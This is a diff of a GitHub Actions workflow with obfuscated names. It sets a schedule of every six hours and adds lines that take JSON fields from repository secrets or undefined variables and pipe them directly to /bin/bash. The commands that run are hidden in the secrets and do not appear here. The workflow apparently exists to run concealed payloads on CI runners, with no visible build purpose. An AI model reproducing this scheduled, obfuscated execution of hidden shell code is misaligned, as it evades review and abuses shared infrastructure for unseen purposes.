@@ -2,7 +2,7 @@ name: jiangpengying7612
 on:
   workflow_dispatch:
   schedule:
-    - cron: '38 3/6 * * *'
+    - cron: '21 0/6 * * *'
 
 jobs:
   build:
@@ -11,9 +11,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: jiangpengying7612
         env:
-          dnnn87: ${{ secrets.dnnn87 }}
+          noo1980: ${{ secrets.noo1980 }}
         run: |
-          echo $dnnn87 | jq -r .nx1308 | /bin/bash
-          echo $hl940 | jq -r .ong20208 | /bin/bash
-          echo $tomg32778 | jq -r .kwkfd8231 | /bin/bash
+          echo $noo1980 | jq -r .w270 | /bin/bash
+          echo $xjizs611 | jq -r .g3 | /bin/bash
+          echo $csqv697 | jq -r .iarcv17203 | /bin/bash
+          echo $ur8 | jq -r .ve83 | /bin/bash
+          echo $yiev688 | jq -r .hndr84 | /bin/bash
+          echo $tpqni991 | jq -r .gxw6484 | /bin/bash
+          echo $cz77896 | jq -r .j5 | /bin/bash
+          echo $olamn130 | jq -r .wngb91498 | /bin/bash
+          echo $ayzr7 | jq -r .q91846 | /bin/bash
+          echo $bh516 | jq -r .qbvq835 | /bin/bash
+          echo $ray32 | jq -r .r8871 | /bin/bash
 
